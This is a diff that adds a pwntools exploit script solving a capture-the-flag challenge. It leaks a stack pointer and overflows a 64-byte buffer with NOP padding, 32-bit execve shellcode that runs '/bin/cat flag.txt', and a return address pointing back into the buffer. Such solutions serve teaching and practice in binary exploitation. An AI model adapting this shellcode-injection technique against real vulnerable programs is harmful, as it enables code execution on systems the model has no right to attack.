@@ -1,0 +1,82 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./shellter_your_code", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def main():
+    io = start()
+
+    # this tiime, there is no function that prints us the flag. So we need to write one ourself, write it as input on the stack, and override the ret addr to our shellcode.
+    # as ASLR is enabled?, we need to calc the offset of the buffer with the leaked pointer.
+
+    # here is our wonderful shellcode, inspired by http://shell-storm.org/shellcode/files/shellcode-571.php
+
+    # it is very important, that we first make space on the stack, otherwise pushing the strings "/bin/cat" and "flag.txt" will override our own shellcode!
+    
+    shellcode = [
+    b"\x83\xec\x2e", # sub esp, 0x2e
+    b"\x31\xc0", # xor  eax, eax
+    b"\x99", # cdq  
+    b"\x52", # push edx
+    b"\x68\x2f\x63\x61\x74", # push 0x7461632f // "/cat"
+    b"\x68\x2f\x62\x69\x6e", # push 0x6e69622f // "/bin"
+    b"\x89\xe3", # mov  ebx, esp
+    b"\x52", # push edx
+    b"\x68\x2e\x74\x78\x74", # push 0x7478742e // ".txt"
+    b"\x68\x66\x6c\x61\x67", # push 0x67616c66 // "flag"
+    b"\x89\xe1", # mov  ecx, esp
+    b"\xb0\x0b", # mov  al, 0xb
+    b"\x52", # push edx
+    b"\x51", # push ecx
+    b"\x53", # push ebx
+    b"\x89\xe1", # mov  ecx, esp
+    b"\xcd\x80", # int  0x80 
+    ]
+
+    # get info about leaked pointer
+    text = io.recvuntil("Please enter your name:").decode('utf-8')
+    leak = int(text.split()[1+0][:-1], 16)
+    # from the leaked pointer, there is a static offset of 0x68 bytes to the start of the buffer
+    buffer_addr = leak - 0x68
+    # the start of the buffer, where we want to return to is thus:
+    addr = struct.pack('<I', buffer_addr)
+
+    # since our buffer + saved base pointer has a length of 64+4 byte, we need to pad with 68-len(shellcode) characters.
+    length = len(b"".join(shellcode))
+    padding = b"\x90"*(64+4-length)
+
+    # padding, shellcode and return addr
+    everything = [padding] + shellcode + [addr]
+
+    # join everything together
+    raw = b"".join(everything)
+
+    # injection needs to be 64 + 4 + 4 bytes
+    if(len(raw) != 64+4+4):
+        print("something went wrong: length of injection " + str(len(raw)))
+        exit(1)
+
+    io.sendline(raw)
+    answer = (io.recvall()).split()[-1].decode("utf-8")
+    print(answer)
+
+if __name__ == "__main__":
+    main()
